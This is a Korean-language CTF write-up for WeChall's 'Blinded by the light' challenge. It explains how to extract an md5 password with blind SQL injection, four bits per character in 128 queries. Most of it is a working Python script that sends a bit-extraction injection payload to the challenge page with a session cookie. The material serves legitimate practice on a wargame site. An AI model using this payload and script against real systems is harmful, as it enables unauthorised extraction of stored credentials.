# [WeChall] Blinded by the light - Writeup

## Blind SQL Injection

md5 해시된 랜덤 패스워드를 128번 이하의 쿼리 전송으로 구해야하는 Blind SQL Injection 문제다.

패스워드는 md5 포맷인 `[0-9a-f]{32}` 꼴로 이루어져 있다.

```
'0' = 0x0 = 0b0000
'1' = 0x1 = 0b0001
'2' = 0x2 = 0b0010
'3' = 0x3 = 0b0011
'4' = 0x4 = 0b0100
'5' = 0x5 = 0b0101
'6' = 0x6 = 0b0110
'7' = 0x7 = 0b0111
'8' = 0x8 = 0b1000
'9' = 0x9 = 0b1001
'a' = 0xA = 0b1010
'b' = 0xB = 0b1011
'c' = 0xC = 0b1100
'd' = 0xD = 0b1101
'e' = 0xE = 0b1110
'f' = 0xF = 0b1111
```

즉, 1글자의 경우의 수는 16이며, 이것을 2진수로 바꾸면 4비트가 되므로, 1글자당 4번씩 총 128번의 쿼리 전송으로 패스워드를 알아낼 수 있다.

(Time Based SQL Injection을 이용하면 글자당 1번의 쿼리 전송으로도 가능하겠지만 느리므로 패스)

``` python
import urllib.parse, urllib.request

SESSION = '**secret**';

def inject(a, b):
	url = 'http://www.wechall.net/challenge/blind_light/index.php'
	post_data = {
		'injection':"'||mid(lpad(conv(mid(password," + str(a + 1) + ",1),16,2),4,0)," + str(b + 1) + ",1)='1",
		'inject':'Inject'
	}
	headers = {
		'Content-Type':'application/x-www-form-urlencoded',
		'Cookie':'WC=' + SESSION
	}

	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
	res = str(urllib.request.urlopen(req).read())

	if 'Welcome back' in res:
		return '1'
	else:
		return '0'

def main():
	pw = ''
	for a in range(0, 32):

		temp = ''
		for b in range(0, 4):
			temp += inject(a, b)
			print(temp)

		pw += hex(int(temp, 2))[2:]
		print('Password:', pw)

if __name__ == '__main__':
	main()
```